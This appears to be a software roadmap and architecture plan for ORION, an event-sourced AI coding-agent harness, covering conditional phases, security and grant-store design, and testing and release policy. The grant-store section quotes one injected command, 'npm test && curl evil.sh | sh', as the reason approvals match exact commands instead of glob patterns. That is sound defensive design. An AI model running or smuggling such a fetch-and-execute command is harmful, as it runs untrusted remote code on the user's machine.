**Dependencies.** P0 (CONDITION B1), P1 (quota resilience), and ideally P2 so delegation tasks are
measured under correct isolation.
**Benchmarks.** The whole of §D.3, plus X1–X10.
**Acceptance.** `e5-frontier-report.md` exists with verified success by class, fabrication rate,
cost per verified success, degradation slope, the X1–X10 ledger, layer attribution for every
failure, and a §11.4 honest-negatives section.
**Non-goals.** No `v0/src` change during measurement. No feature work chosen on intuition before the
data lands.

### E.4.1 What each E5 outcome triggers

| Finding | Consequence |
|---|---|
| Material long-horizon degradation with trajectory length | **P6 activates** — context / compaction / retrieval prioritised |
| Strong long-horizon performance | **P6 stays deferred.** Do not introduce speculative memory infrastructure because competitors have it |
| Coding quality fails on multi-file or whole-repo work | **P9 activates** — agent loop, tooling, verification |
| Autonomy fails (approval fatigue, resource contention, stalls) | **P8 activates** |
| Fabrication rate > 0 | **P7 raised in priority**, and the defect treated as a correctness bug rather than a metric |
| Harness contribution unclear | **P10 (E6)** becomes the next measurement |
| **Everything passes** | see §E.4.2 |

### E.4.2 The result this plan must not fumble

**If E5 comes back strong across the board, every conditional branch above is unfired and the plan
appears to have no next step.** That is not an anticlimax; it is a finding, and it is plausible —
E4 already returned 45/54 with zero provider, tool or runtime failures.

**Declared in advance:** a uniformly good E5 means the bottleneck was never capability, and the
remaining roadmap is **developer surface and trust**. P5 and P7 become the whole game; P10 (E6)
becomes urgent, because the natural next question is *"how much of that was the model?"*; P6 and P9
stay deferred with the evidence recorded. This is written down now so that a good result cannot be
quietly replaced with more feature work.

---

## P5 — Developer product / trajectory surface *(unconditional)*

**User problem.** ORION's guarantees are invisible. A developer cannot answer *what did it do, what
changed, what did it cost, why did it stop* without reading source.

**Current gap (FACT).** `--json` on 5 of 16 verbs; no timeline, no export, no SDK, no `.d.ts`, no
server mode. Comparators ship a Textual TUI (Deep Agents), share links and per-session cost
(OpenCode), and messaging gateways (Hermes).

**Scope — old W12, preserved in full and expanded.**

*Trajectory product:* sessions · turns · timeline with filtering, pagination and search · event
inspection · tool activity · plan visualisation · verification display · artifact navigation ·
diffs · lineage visualisation · provenance display · cost and token display · approvals · resources
· recovery state · replay · fork · **export / share a trajectory** · import for inspection ·
**undo / restore** — file and hunk restore from the trajectory, emitted as a **new attributable
event** with its own write witness, verified against the pre-state witness; workspace restore,
never history rewrite (the I.3 "mutable transcript" rejection stands).

*Developer interface:* polished TUI · live execution streaming · interaction and steering ·
interruption and cancellation · resume · session navigation · approval UX · error and
degraded-state UX · queued prompts · fork from a visible point · **explicit operating modes —
`ask` / `plan` / `code` / `review`, implemented as policy gates (permission set + truthful-
completion level), never as new execution semantics** · **zero-config model selection — one
command picks a model and loads its correct profile (O1–O2, §D.7)**.

*Public surface:* `--json` on **all 16 verbs** · SDK convenience factory · **published `.d.ts`** ·
stable public API with a **deprecation policy** · **server / API mode** · embedding and integration
surface · export / import · **eval as product — `orionctl eval` / `orionctl benchmark` /
`orionctl compare`**, exposing the E5/E6 machinery to the developer on the Ori Eval pattern (pinned
harness + model per run; asserts on tool use; CI-runnable) — **gated post-E5, never before the
measurement exists**.

**Constraint, absolute.** The UI and API are **projections over the trajectory**. They never become
a competing source of truth.
**Event / provenance impact.** None — read-only projections.
**Security.** Export must redact secrets; a shared trajectory must not leak workspace contents.
**Dependencies.** Stable run and turn projections (already stable). No contract change.
**Benchmarks.** UX quality is not directly measurable, but **product correctness is**, and §D.0
requires measurement to be first-class. The following are objective gates that must pass before this
phase is accepted:

| ID | Gate | Bar |
|---|---|---|
| U1 | Every supported verb exposes its **documented JSON contract** | 100% of supported verbs; schema-validated |
| U2 | **Trajectory view and `explain` agree with the durable event log** | 100% — any divergence is a defect, not a rendering choice |
| U3 | **Fork from a visible event N produces identical lineage** to the CLI `fork --at N` | byte-identical lineage |
| U4 | **An exported trajectory imports without provenance loss** | every provenance field survives the round trip |
| U5 | **An SDK consumer can create, run and inspect a trajectory using only public exports** | no deep imports into internals |
| U6 | **Zero secrets in exported or shared trajectory fixtures** | 0, no tolerance — joins the Level A security gates |
| U7 | Time-to-answer the six §C.0 questions | captured in the **later usability study** (§D.5), not fabricated now |
| U8 | **One-command model selection starts a correctly configured live session** for every supported profile | O1–O2 (§D.7) green for every profile; no manual config in the flow |

**Qualitative acceptance test (retained).** The E5 report can be generated *from the product* rather
than from bespoke scripts, and a developer who has never seen ORION can answer the six questions in
§C.0 from a run id without reading source.
**Made-to-fail.** A projection that disagrees with the log must fail loudly — U2 is the guard, and
it must be falsified once by deliberately desynchronising a projection. A restore must be
re-runnable against the pre-restore witness — a restore that cannot replay is a defect, not a
feature. An operating-mode boundary must be a permissions gate, not a prompt suggestion — crossing
it without a grant must fail loudly.
**Non-goals.** No web UI beyond server mode; no multi-user features (P12).
**Why unconditional.** It is additive, needs no contract change, and is the difference between the
moat existing and the moat mattering. **This is the most likely failure mode of the whole project
if skipped.**
**Stream.** Eligible as the **secondary stream** under §C.7 — it alters no execution semantics.

---

## P6 — Context, compaction, retrieval, memory *(conditional on E5)*

**Trigger.** E5 shows material long-horizon degradation, **or** K0 (below) shows real retrieval
demand. **If neither holds, P6 stays deferred and the evidence is recorded.**

**Current gap (MEASURED).** Compaction is implemented and effectively never fires: ~6 KB outbound
against a 24 KB budget, **zero** compaction events in 54 E4 runs (D5). The long-horizon story is
unevidenced.

**Scope — old W11, preserved in full.**

**K0 first, and K0 is not code.** Measure retrieval *demand* from E5's long trajectories: how often
does a run reference an event older than window + clamp + eviction? This is the gate.

Then, only if demand is real, the context ladder completes:

```
bounded window -> clip -> evict -> summarize -> retrieve -> memory
```

*Memory:* layered **working / project / team** memory. **Every memory is a derived claim with a
provenance link to the events that produced it** — never an independently writable store.
Requirements: provenance · attribution · retrieval visibility · deletion and retention semantics ·
trajectory linkage · isolation between users and projects · **replay-compatible context evolution**.
Emits `context.retrieved` (reserved since v1, and the last unused member of the frozen vocabulary).

**Architectural constraint, absolute.** Any transformation that affects future execution must be a
**durable, attributable event**, never a read-time computation — a summariser computed on read
breaks Invariant 2.
**Event / provenance impact.** `memory.*` into the frozen set, `context.retrieved` emitted —
contract bump, additive, with a forward-migration test.
**Security.** Memory isolation between projects and principals. Stale-memory damage is a measured
risk, not an assumed benefit.
**Dependencies.** P4 (E5 long trajectories), K0.
**Benchmarks.** C2 context growth curve · C3 compaction retention · K1 retrieval precision · K2
recall · K3 stale-memory damage · K4 useful-context uplift · K5 token savings.
**Made-to-fail.** Seed a probe answerable only from a compacted region; C3 must fail if retention
silently breaks.
**Acceptance.** Compaction demonstrably fires at measured trajectory lengths; retrieval improves a
measured outcome; replay equivalence holds across summarisation.
**Non-goals.** **No vector infrastructure without measured need.** No read-time summarisation, ever.
**Why conditional.** Building retrieval on an unexercised eviction path is building on sand.

---

## P7 — Truthfulness, published *(unconditional, small, strategic)*

**User problem.** A developer cannot tell which harnesses lie about success.

**Scope.** Run the entrapment set across every available provider; publish `fabrication_rate` and
`honest_failure_rate` with the method, including unflattering results.

**Why this is strategy, not marketing.** A truthful-completion contract was found in **zero of
eight** comparators and is the cheapest item on the moat list to copy (§C.3.3). Its only durable
protection is being the one who published the number first, because the metric embarrasses anyone
optimising for demo-quality success rates.
**Dependencies.** P1 (live providers), P4 (entrapment set executed).
**Benchmarks.** F1, F4.
**Made-to-fail.** Weaken the completion contract; F4 must rise above 0.
**Acceptance.** Published with method, with any bad result intact.
**Non-goals.** No comparative claim about another harness's fabrication rate without running it
under the same conditions.

---

## P8 — Autonomy maturity: background execution, delegation, budgets *(conditional)*

**Trigger.** E5 results, real developer usage, **or an explicit product requirement** demonstrates a
need for detached/background execution, parent-continues-child execution, durable autonomous
budgets, **or persistent background shell processes (§I.2's process-lifecycle case)**.

**Why the trigger is deliberately wider than E5.** E5 runs foreground, attended tasks — it does not
exercise detached or background-execution semantics at all. Tying this phase solely to E5 evidence
would leave it deferred indefinitely even when background execution is a genuine requirement, which
would be the wrong kind of evidence-discipline: the absence of a measurement is not the absence of a
need. Approval fatigue and resource contention *are* E5-observable; detachment is not.

**Current gap (FACT).** No background or detached execution: every run occupies a foreground
process (D6). Tool dispatch is sequential except a consecutive-delegate batch, so the parent cannot
work while a child runs. Children receive a task string and return a terminal string — no input
manifest, no aggregation step.

**Scope.**

1. **Background / detached execution.** Deliberately placed **here, not in operations**, because it
   changes execution semantics: it interacts with leases, fencing, cancellation, resources, child
   execution, quotas, persistence and recovery. A detached run must be fenced, resumable and
   cancellable exactly as a foreground one.
2. **Background children** — the parent continues while a child runs. **The hard part, stated
   honestly:** the parent must interleave `child.finished` into its window **and replay must
   reproduce the interleaving deterministically**. That is a genuine design problem, not an
   implementation task, and it must be designed and written up before any code is written.
3. **Structured delegation** — an input manifest (paths plus an expected-output schema in
   `spawnedPayload`), batch aggregation, and a **converge-and-verify** parent step.
4. **Durable budgets** — token, dollar, wall-clock, model-call, retry and child-budget inheritance,
   all accounted from the fold.
5. **Scheduling** — only if a user problem is demonstrated; otherwise Part I.
6. **Persistent background shell processes** — live developer-run servers and shells
   (`npm run dev`, watchers, REPLs) that outlive individual tool calls. The process is a
   **W6-class resource with durable identity and lifecycle**: `process.spawned` / `process.output` /
   `process.exited` events, `orionctl ps` / `logs` / `kill`, budgeted, fenced and cancellable
   exactly like a foreground resource, and covered by recovery. **Distinct from items 1–2**: those
   are *agent* detachment; this is *process lifecycle* the agent drives as a tool. This is the
   process-lifecycle case the plan's I.2 section now records — the trigger above admits it into P8
   explicitly so it is not stranded as a candidate.

**Event / provenance impact.** Background children require a deterministic interleaving rule in the
fold, and likely new types for detached lifecycle. Contract bump, additive.
**Security.** A detached run must not escape posture or grant scope; quotas must bind.
**Dependencies.** **P2 (isolation) is a hard prerequisite** — background children without per-child
workspaces would multiply the collision risk.
**Benchmarks.** I1 subagent uplift (**must be allowed to come out negative**) · I2 cost
amplification · I3 latency · I4 context isolation · I5 delegation correctness · N5 concurrent runs ·
N7 **process-lifecycle gate** (spawn → output streaming → kill → recovery, and the orphan test) ·
D-series.
**Made-to-fail.** Disable the interleaving rule; replay equivalence must break loudly. A background
process must survive its originating tool call, stay inside posture and budget, and be killable by
`orionctl kill` — a leaked orphan is a defect, not a quirk.
**Acceptance.** A detached run survives terminal close, is cancellable, resumes correctly and
replays identically. I1 measured against a single-agent baseline.
**Non-goals.** **Not a workflow engine** — §18 rejects it and the rejection stands.
**Gate.** If I1 shows subagents cost 3× and improve nothing, this phase shrinks to the manifest
handoff and background-child work is dropped.

---

## P9 — Agent capability *(conditional on E5)*

**Trigger.** E5 shows coding quality failing on multi-file or whole-repository work.

**Scope — driven by what E5 exposes, not by a feature list.** Candidate areas, each requiring the
§C.6 gate before entry: exploration strategy · planning quality · tool-selection accuracy · retry
quality · replanning · verification effectiveness · termination correctness · richer developer
tooling where a measured gap exists.

**Benchmarks.** B1–B6, A1–A7.
**Made-to-fail.** B6 (termination correctness) must go red if the completion contract weakens.
**Acceptance.** A measured improvement in verified success on the failing class, **with no
regression in any Level A gate** (Part G).
**Why conditional.** Improving the agent before measuring it is how the E4 era's effort was nearly
misdirected.

---

## P10 — E6 controlled harness attribution

**Scope.** Execute Part D §D.4.
**Dependencies.** P4 (E5 stable), plus a justified baseline-harness selection.
**Acceptance.** A report isolating ORION's contribution with every confound stated.
**Why here.** It is the natural next question after E5, and the measurement most likely to be
externally persuasive.

---

## P11 — Production operations *(old W13, preserved in full)*

**Scope.** Backup and restore · retention policy · artifact GC · trajectory archival · structured
logging · metrics · **tracing seam** (no-op default) · health and readiness · operational
diagnostics beyond `doctor` · concurrency measurement (**E3**, already executed — store integrity
holds at ≥16 writers) · load tests · soak tests · security tests · upgrade tests · release
verification · **rollback strategy**.

**Dependencies.** P5 (observability surfaces), P8 (background execution changes what must be
operated).
**Benchmarks.** N1 startup · N2 resume latency · N3 storage growth per 1k events · N4 event
throughput · N5 concurrent runs · N6 recovery throughput.
**Made-to-fail.** Corrupt a backup; restore must fail loudly rather than silently produce a partial
trajectory.
**Acceptance.** **Exit = Level 3** (production single-user runtime). A v0.2.x database migrates
forward in CI and replays identically; a documented rollback is exercised.
**Non-goals.** No hosted infrastructure.

---

## P12 — Hosted scale and team learning *(old W14, preserved in full — demand-gated)*

**Both tracks are gated on real usage that does not yet exist.**

**P12a — Scale.** Postgres Store **behind the unchanged `Store` API made possible by W5** ·
queueing · rate limiting · idempotency store · leader coordination · object storage for artifacts ·
multi-tenancy enforcing `scope` and `principal` · resource quotas. **Postgres is an incremental
future backend, not a forced rewrite. Do not replace SQLite prematurely.**

**Trigger.** Demonstrated external usage that SQLite cannot serve. **Until then the option costs
nothing** — W5 bound the raw SQL into the Store boundary, which is precisely why this can wait.

**P12b — Team learning (RESEARCH ONLY).** "Git for coding harnesses":

```
trajectory -> patterns -> proposed harness change -> review -> version -> measurement -> accept/reject
```

Every adaptation **attributable, inspectable, versioned, reviewable, reversible, measurable**.
**No autonomous self-modification.** Gated behind real multi-user data.

**Status: HYPOTHESIS.** §C.3.4 records that this must not appear in positioning until something is
measured. Its dependency is not engineering — it is *verified trajectory evidence at multi-user
scale*, which is also why P7's fabrication work matters strategically: learning from unverified
trajectories would learn from fabrications.

**Benchmarks.** N-series; multi-tenancy isolation gates (Level A).
**Non-goals.** No speculative hosted infrastructure before demand.

---

## E.13 Recommendation — the immediate sequence

**W10 complete. Next action: P0 — commit the three pending fixes and pin the measurement baseline.**

The immediate sequence, in order:

```
P0  commit pending fixes, pin a clean SHA          (hours)
P1  provider truth + retry/rotation + watchdog     (small; unblocks every live gate)
P2  child isolation debt                           (correctness; W10 inverted this dependency)
P3  provenance fields                              (cheap; batched contract bump with P2)
P4  E5 frontier measurement                        (~122 runs, ≈$1.50 est. — §D.3.1)
    → the evidence then selects among P5 / P6 / P8 / P9, per §E.4.1
P5  developer product                              (unconditional; eligible as secondary stream)
P7  publish the fabrication rate                   (unconditional; small)
P10 E6 controlled attribution
P11 production operations
P12 hosted scale + team learning                   (demand-gated)
```

**Why this order and not the previous edition's.** Three things changed. The commodity gap closed
(W6–W10), so the old "close the capability gap then productise" framing is spent. The model-grade
ceiling lifted, so measurement that was uneconomic is now ~$1.50. And W10 left a correctness debt
that must be paid before parallelism is used in anger.

### Answering the standing question

**Can ORION become a production-grade developer harness without abandoning the event-sourced
trajectory?**

> **YES — and the evidence is now stronger than when this question was first asked.**

Every gap in §B.6 and §B.7 sits *above* or *beside* the trajectory model, and none is caused by it.
Migrations are a storage concern. Isolation is a process concern. Background execution is a
lifecycle concern. Every missing capability has a natural expression as trajectory events, and
§C.5, §F.1 and §F.4 record the safe mapping for each. W6–W10 added resource identity, grants,
skills, MCP and child trajectories **without a single competing source of truth**, which is the
strongest available evidence that the model scales to the remaining work.

**The architecture is not the constraint. It is the asset — and it is why the remaining work is
additive rather than a rewrite.**

### The two risks that would actually kill this

1. **The moat stays unexperienced.** Four structural properties nobody can see are worth nothing.
   If P5 never happens, the differentiator remains a private engineering satisfaction. **This is the
   most likely failure mode.**
2. **A capability regression trades a guarantee for a score.** Watch for `task success ↑ but runtime
   guarantees ↓` — for example adopting whole-file writes because they make coding tasks easier, at
   the cost of content-addressed recovery. Part G's no-regression gate exists to make this visible:
   any phase that improves A-series while degrading a Level A gate is a regression regardless of the
   headline.

And one process risk worth naming: **measuring the instrument instead of the subject.** Three of
four major findings in this project's history were rig defects wearing capability costumes (§A.3).
The discipline that caught them — cross-checking every reported metric against the durable log — is
the real competitive advantage in process terms, and it is the first thing that erodes under
schedule pressure.

---

# PART F — SECURITY AND AUTONOMY ARCHITECTURE

## F.1 Recovery 2.0 and resource identity — full disposition (DELIVERED in W6)

The previous plan's Wave 5 read:

> Model external resources (sandbox, future MCP session) with identity and lifecycle so resume
> **reattaches** rather than reconstructs. Prior art: TrueForge `TurnResourceResolver`.

This section answers the four questions that disposition requires.

### 9.1 What was Recovery 2.0 intended to solve?

Recovery today (ADR-002/003/011) is **effect-level**: it answers *"did this invocation's effect
land?"* using the recovery class and a `verify()` probe. That is complete for filesystem effects
whose evidence is on disk.

It is **silent about external handles.** When a run resumes after a crash, any resource it was
bound to — a sandbox container, a stateful MCP session, a workspace checkout — is either still
alive (and should be **reattached**), gone (and must be **recreated**, with the run told), or in an
unknown state (and must **escalate**). Today ORION has no vocabulary for any of those, because it
has no resources: `LocalSandbox` is reconstructed from a path every time, which is invisible only
because a path is not stateful.

**Recovery 2.0 = extending the recovery contract from effects to resources.**

### 9.2 Which parts remain correct?

All of the original objective. Specifically:

- Resources need **durable identity**, or resume cannot reattach.
- Resume must **reattach rather than reconstruct** — reconstruction silently changes the world the
  recovery contract reasoned about.
- **MCP sessions are resources**, so resource identity gates MCP. The prior plan's "critical path
  1 → 5 → 6" was right and is preserved as **W5 → W6 → W9**.
- TrueForge's `TurnResourceResolver` is the correct prior art (verified at source:
  `resolveSandbox` reattaches via `existing.sandbox_id`; `resolveAgentDefinition` resumes MCP via
  `previousTurn.snapshot.mcp_servers[name].session_id`).

### 9.3 Which parts need to change?

**One thing, and it is architectural.** TrueForge stores resource identity in a **mutable
`TurnRecord.snapshot`** — state beside the log. Copying that shape would violate Invariant 1 and
break replay determinism.

**ORION's version must record resource binding as events** — `resource.acquired` /
`resource.reattached` / `resource.released` / `resource.lost` — with the current binding derived by
a fold, exactly as `plan.*` works for plans. This is more work than a column and it is the
difference between preserving replay and quietly breaking it.

**Second change, from the new sandbox evidence.** The original wave treated resources abstractly.
It is now clear the **first and most important resource is the sandbox itself**, and that the
sandbox is simultaneously the security boundary (§10). Building resource identity without a
stateful resource to bind would produce an untested abstraction; building a sandbox without
identity would produce one that cannot survive resume. They are one wave.

### 9.4 Which parts become part of the execution-environment wave?

All of them. **Recovery 2.0 is not deleted, deferred or diluted — it is W6's parts C, D, H, I and
J, and it supplies W6's blocking acceptance gate.** The end-to-end proof in §10.2 *is* the Recovery
2.0 proof.

**The Q4 gate (from the competitive audit, carried forward and still blocking):**

> *Does a container backend actually enable auto-allow **without breaking the recovery contract**?*

The pre-state witness, `attachCheckpoints` (which shells to host `git`), and the crash matrix are
all computed against the **current filesystem identity**. A container changes that identity. If
that cannot be reconciled, W6 stops and reports rather than shipping a boundary that silently
invalidates recovery.

---

## F.2 Security roadmap

**The distinction the plan must never blur:**

> **Path containment is not OS isolation.**

| Layer | Today | Target | Wave |
|---|---|---|---|
| **Policy** | Strong — posture floor, `effects`-keyed protected paths, command denylist keyed on the argument (F1) | maintained + deployer rule file | W8 |
| **Containment** | Partial — `..`/symlink rejection, output clamps, `scrubEnv` | maintained | — |
| **Isolation** | **NONE** | OS-enforced backend | **W6** |
| **Authorization** | Good for tools | + resource authorization | W6 |
| **Network control** | **NONE** | default-deny egress; metadata/link-local blocked | **W6** |
| **Identity** | `scope`/`principal` unenforced | enforced | W14 |
| **Auditability** | **Excellent** — the log | maintained + `force:true` audited | W5 |
| **Recovery** | **Excellent** | + resource-aware | W6 |

**Rule: autonomous coding by default depends on a credible isolation boundary.** Autonomy is
enabled by W6-G (posture derived from capability), **never by weakening authorization to make
autonomy easier.**

**Required work:** OS-enforced sandbox · per-run workspace boundary · network default-deny ·
metadata/link-local protection · resource authorization · **grant store (W6-M): a security/autonomy
subsystem of remembered approvals** — session / project / command-pattern / resource scoped ·
hostile-repository tests · prompt-injection resistance **through architectural controls** (MEASURED:
prompt policy is advisory — two model families both fabricated `live_test_key` and reported success)
· MCP security boundary.

---

## F.3 Scalability roadmap (execution-side; hosted scale is P12a)

**Do not replace SQLite prematurely.** The first bottleneck is not storage.

**Bottleneck order (from `ORION-DEEP-COMPARATIVE-ARCHITECTURE-AUDIT.md` §15):**
1. `execFileSync` blocks the event loop — caps at 1 run/process **(W5)**
2. Global `BEGIN IMMEDIATE` write serialisation
3. `synchronous=FULL` fsync cost (MEASURED: 0.0136 → 0.313 ms)
4. O(n) replay/fork (MEASURED: 1,784 / 1,860 ms and 877 MB at 1M events)
5. Unbounded log growth (MEASURED: ~596 B/event, 598 MB at 1M) **(W13)**

| Stage | Requires | Wave |
|---|---|---|
| **Local** — SQLite/WAL, multiple processes, bounded concurrency, async execution | W5 | W5 |
| **Small team** — measured concurrency, resource isolation, retention, artifact GC, telemetry, backup/restore | E3 measured | W6, W13 |
| **Hosted** — Postgres Store, queueing, rate limiting, idempotency, leader coordination, object storage, multi-tenancy, quotas | W5's Store boundary | W14 |

> **Postgres is an incremental future backend behind the `Store` abstraction, not a forced rewrite
> today.** W5 exists partly to keep that true: with SQL leaking into the reaper and replay, a
> backend swap would require rewriting the CAS reclaim and fork bulk-copy, each carrying the
> fencing semantics that make reclaim safe.

**MEASURED gaps (experiments owed):**
- **E1** — `durability: full` at 100k/1M events. *(W5)*
- **E2** — lease survival across blocking tool calls. *(W5)*
- **E3** — 2/4/8/16 concurrent processes: claim latency, `SQLITE_BUSY`, append p99, lease loss.
  *(W13)* Currently **UNKNOWN — NOT YET MEASURED**; must precede any storage decision.

---

## F.4 Grant Store — full disposition

**Status: SHIPPED in W6-M.** This section records the architecture and the benchmark obligations,
not future work. The Grant Store is **required security/autonomy infrastructure**, not a marketing
differentiator (§C.3.2).

### F.4.1 Why it is required and not optional

An approval that is forgotten at the end of a turn is not an approval — it is a prompt. Without
memory, "autonomous execution" means being asked about `npm test` on turns 3, 7 and 12 of the same
task, which trains the operator to approve without reading. That is worse than asking once, because
it **manufactures consent**.

Two mechanisms answer different questions and both are needed:

| | Question | Nature |
|---|---|---|
| **G** — capability-derived posture | *Can this be auto-allowed?* | a property of the boundary the command runs inside |
| **M** — the Grant Store | *Was this already approved, and does that still hold?* | a property of what a human decided |

**Rule, retained:** never ship the boundary (G) without approval memory (M). Autonomy whose
approvals reset every turn is not autonomy.

### F.4.2 Why events, not a table — answering the storage question directly

**DECIDED: trajectory events plus a derived projection.** Not authoritative mutable state.

A grant decides whether a *future* effect is permitted, so it is exactly the kind of fact that must
be reconstructible by replay rather than read out of mutable state beside the log. A grants table
would make an authorization decision depend on whatever the table happened to hold at read time,
and a replayed run could then reach a **different decision than the original** — which would make
the trajectory a story rather than a record. It would also violate Invariant 1.

**Cross-run scope without leaving the log.** A project-scoped grant must outlive the run that
created it, and events are per-run. The resolution is a cross-run **query** over grant events
(`Store.grantEvents`), not a second store: the events remain the only source of truth and the query
is an index into them, not state beside them.

**Matching is normalised-exact, never glob.** The obvious design is to grant a pattern like
`npm *`. It is also how this becomes a vulnerability: `npm test` and
`npm test && curl evil.sh | sh` both match `npm *`, and the second is a different command with a
different meaning. Grants therefore match a **normalised exact command string**. The cost is that
`npm test -- --watch` needs its own approval; that is the correct trade, and it is why the
normalisation touches only whitespace and never structure.

### F.4.3 Dimensions that must stay covered

| Dimension | Status | Benchmark |
|---|---|---|
| Session grants | shipped | S1 |
| Project grants (cross-run) | shipped via `Store.grantEvents` | S6 |
| Tool / path / command-pattern grants | shipped, normalised-exact | S5 |
| **Resource grants** (MCP server, container) | shipped | **S7** |
| Expiry | shipped | **S1** |
| Revocation (`orionctl revoke`) | shipped | **S2** |
| Provenance — who granted, when, why | shipped | X8 |
| **Replay semantics** — a replayed run reaches the identical decision | by construction | **S2** |
| **Fork semantics** — each branch projects grant state from its own events | by construction | **S3** |
| **Child / grandchild inheritance** — only within declared scope, at every posture | shipped | **S4** |
| Interaction with sandbox capability | posture floor may only raise strictness | G-series |
| Interaction with MCP | MCP sessions are W6 resources; grants scope to them | S7 |
| Interaction with subagents | a child inherits no approvals by default; the parent may only grant tools it holds | S4, G8 |

**The gap is coverage, not design.** S1–S7 are defined in §D.2 and are **UNKNOWN — NOT YET
MEASURED**. They are obligations on the next benchmark cycle, not new engineering.

### F.4.4 Standing rule

**Autonomy is never achieved by weakening authorization.** A phase that increases autonomy must do
it by making approvals *remembered and scoped*, never by lowering a posture or widening a match.


---

# PART G — TESTING AND RELEASE POLICY

## G.1 Testing policy — cross-cutting and permanent

Applies to **every** wave. Not optional, not per-wave negotiable.

### 11.1 The five required layers

1. **Mechanism tests** — unit/integration for the module.
2. **Shipped-path tests** — `tests/shipped/`, asserting the wiring `orionctl` actually composes.
   *If a mechanism is not reachable from here, it is not shipped.*
3. **Real terminal acceptance** — the packed/installed build, a real model, ground truth verified
   on disk and by the test runner, never the run's self-report.
4. **Failure and stress tests** — SIGKILL · timeouts · concurrency · network failure · provider
   failure · resource failure · malformed input.
5. **Cross-platform** — where relevant; Windows is first-class.

### 11.2 The standing manual gate

> **No major feature is considered proven until a real installed-build terminal test exercises it
> with a real model.**

Established by evidence, not preference. Wave 1's three defects were wiring gaps 654 passing
assertions could not see; Wave 2's Gemma array-parsing defect was missed by 700+; Wave 4's F5 was
missed by 904. **A passing suite is necessary and has now three times been insufficient.**

Per wave: install → execute (verify the file on disk and the test result) → durability (SIGKILL,
reap, resume, assert no duplicated effect) → trajectory (`status`, `explain`, `replay` asserting
`model_calls_made: 0`, `fork`) → failure injection relevant to the wave → document commands and
observed output.

### 11.3 Per-wave invariant regression

Every wave must re-prove: replay equivalence · contract additivity (old logs replay) · fencing ·
completion verdicts · **and, from W5, forward migration.**

### 11.4 Every wave report must state

What was exercised · **what was not exercised** · deviations · which product surface exposes the
capability. Wave 4's missing report *caused* F5; the Wave 4 report written retroactively states its
own omissions explicitly, and that is the standard.

---

## G.2 Evaluation strategy (see Part D for the benchmark program)

`runtime ≠ evaluation` stays enforced: benchmark logic in `eval/`, never `v0/src`.

The most reproducible prior finding — **21 infrastructure defects, ~16 first presenting as
agent/task failures, only 2 genuine task defects** — is a statement about the instrument. Wave 0
reproduced it: two of three failures would have been scored "the model can't code."

Therefore, before any capability claim, evaluation must attribute failure across four layers:
**model · provider transformation · runtime · tool**. Wave 4a's normalized-request provenance makes
that attribution possible.

**New in this edition (E3):** every eval report must be labelled with the configuration measured.
`eval/capability-v1/run-baseline.mjs` deliberately runs with no completion contract and no
compaction ("shipped defaults only"); that is a defensible choice whose consequence — eval numbers
do not describe what the CLI ships — must be stated on the report, not discovered later.

---

## G.3 Risk register

| Risk | Severity | Why | Mitigation |
|---|---|---|---|
| **First schema change corrupts deployed DBs** | **CRITICAL** | No migration path; `IF NOT EXISTS` silently no-ops | **W5-A before any schema touch** |
| **MCP or subagents land before isolation** | **CRITICAL** | Third-party code + network on an unisolated host | Enforce W6 → W9/W10 |
| Autonomy enabled by relaxing policy instead of adding a boundary | HIGH | Expedient and wrong | Posture derived from capability (W6-G) only |
| Approval fatigue kills autonomy (remembered-approval gap) | MEDIUM–HIGH | Without a grant store, every isolated-but-unapproved action re-prompts; users revert to last-resort `--allow` or abandon the harness | **W6-M grant store is required**, not optional |
| Q4 fails — containers break the recovery contract | HIGH | Witness/checkpoints assume host filesystem identity | W6 stops and reports rather than shipping |
| Replay equivalence breaks under new events | HIGH | Every wave adds types | Per-wave replay-equivalence test (§11.3) |
| Event-contract churn | HIGH | "39 frozen types" is public | Version the contract; document reserved types |
| **Composition defects invisible to the suite** | HIGH | Six occurrences in four waves | `tests/shipped/` per wave; manual gate |
| Feature sprawl dilutes the differentiator | HIGH | The standard layer is large | Every feature must emit attributable events |
| Store swap becomes a rewrite | MEDIUM | SQL leaked to 3 modules | W5-B |
| Sandbox honesty regression | MEDIUM | Pressure to claim isolation | Keep the honest wording until W6-B is real |
| Capability claims from infra work | MEDIUM | ~16 of 21 defects presented as agent failures | Keep `eval/` separate; label configs (E3) |
| Publishing 0.2.0 slips further | MEDIUM | 0.1.2 is live and reports false success | Publish decision after W5 |

---

## G.4 Release and version policy

- **Current: `0.2.1` published (2026-09-08), verified.** `0.1.2`'s false-success defect and the F1
  security hole were retired by the Wave-5-hardened build. (0.2.0 on the registry is the pre-W5
  build from the prior session; the hardened build shipped as 0.2.1 because npm will not
  republish a taken version.)
- `0.x` minor is the vehicle for behaviour change; the README documents that the public API and CLI
  may change between minors. `1.0.0` asserts a stability commitment not yet earned — there are no
  external users.
- **Event contract: additive only.** Types are never removed or renamed; older logs must replay.
  Contract version bumps are visible and documented in-source.
- Every release: pack validation · leak check · clean-directory install · CLI executable · public
  API import · **from W5, forward-migration test**.

---

# PART H — TECHNOLOGY AND DEPENDENCY POLICY

## H.1 Language and technology strategy

**Node/JavaScript remains correct. Verified, not assumed.**

Six-repository evidence (FACT): every harness that orchestrates processes and files chose
TypeScript/Node — OpenCode (TS on Bun), TrueForge, QM, Ruflo, Claude Code. The Python subjects
(Deep Agents, OpenHarness, Hermes) are ML-framework-adjacent. Codex chose Rust to optimise startup
and binary distribution — constraints ORION does not have.

Node's only material weakness for this workload is embeddings/retrieval, and that is precisely the
capability ORION has deliberately deferred (W11).

**Adopt:** gradual typing · `tsc --checkJs` in CI **(W5)** · published `.d.ts` for the public
surface **(W12)** · stronger boundary schemas.

**Do not plan:** a JavaScript → TypeScript source rewrite (adds a build step to a project whose
"source is what ships" property is a real asset) · Node → Python · a hybrid Python runtime. Revisit
only if a specific subsystem produces evidence.

**Dependency policy.** Zero dependencies today, and that is a genuine asset — not because zero is
magic, but because the platform meets the need. When a dependency becomes justified (MCP SDK is the
expected first), document: **reason · security implications · exact-pin strategy · optional/lazy
installation where appropriate.** Adopt Hermes's discipline — exact pins with written rationale,
provider-specific packages as lazy extras — rather than drifting into ranges. **Never add a
dependency to imitate another project.**

**Provider profiles are configuration, not code.** Model-aware provider profiles (P1/§D.7) are
declarative schemas validated by a machine check. Adopting a new model class adds a *profile*, never
a package, a middleware step, or an event type. A profile must not require a dependency that a
provider's wire format does not already require.

---

## H.2 Context and artifacts — evolution rules

**Retain Wave 3 entirely. Do not replace the artifact model because another harness differs.**

Maintain: artifact identity · sha256 · `source_seq` · provenance · deterministic resolution.
Content-addressed ids mean the same content yields the same id on replay, on a fork, and in another
process — reproducible evidence, not a session-local handle.

**Context evolves deliberately along one ladder:**

```
